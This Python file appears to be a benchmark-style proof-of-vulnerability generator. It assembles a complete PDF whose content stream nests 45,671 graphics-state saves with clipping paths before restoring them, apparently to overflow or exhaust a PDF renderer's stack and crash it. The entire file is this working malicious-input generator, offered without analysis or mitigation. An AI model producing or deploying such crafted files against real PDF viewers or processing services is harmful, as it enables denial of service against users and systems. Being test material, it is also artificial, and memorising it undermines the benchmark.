class Solution:
    def solve(self, src_path: str) -> bytes:
        N = 45671
        clip_op = b"q\n0 0 72 72 re W*\n"
        q_op = b"Q\n"
        stream = clip_op * N + q_op * N
        stream_len = len(stream)
        header = b"%PDF-1.7\n"
        obj1 = b"1 0 obj\n<<\n  /Type /Catalog\n  /Pages 2 0 R\n>>\nendobj\n\n"
        obj2 = b"2 0 obj\n<<\n  /Type /Pages\n  /Kids [3 0 R]\n  /Count 1\n>>\nendobj\n\n"
        obj3 = b"3 0 obj\n<<\n  /Type /Page\n  /Parent 2 0 R\n  /MediaBox [0 0 612 792]\n  /Contents 4 0 R\n>>\nendobj\n\n"
        obj4 = b"4 0 obj\n<< /Length " + str(stream_len).encode() + b">>\nstream\n" + stream + b"endstream\nendobj\n\n"
        offset1 = len(header)
        offset2 = offset1 + len(obj1)
        offset3 = offset2 + len(obj2)
        offset4 = offset3 + len(obj3)
        offset_xref = offset4 + len(obj4)
        xref = b"xref\n0 5\n" + \
               b"0000000000 65535 f \n" + \
               f"{offset1:010d}".encode() + b" 00000 n \n" + \
               f"{offset2:010d}".encode() + b" 00000 n \n" + \
               f"{offset3:010d}".encode() + b" 00000 n \n" + \
               f"{offset4:010d}".encode() + b" 00000 n \n"
        trailer = b"trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n" + f"{offset_xref:010d}".encode() + b"%%EOF\n"
        pdf = header + obj1 + obj2 + obj3 + obj4 + xref + trailer
        return pdf
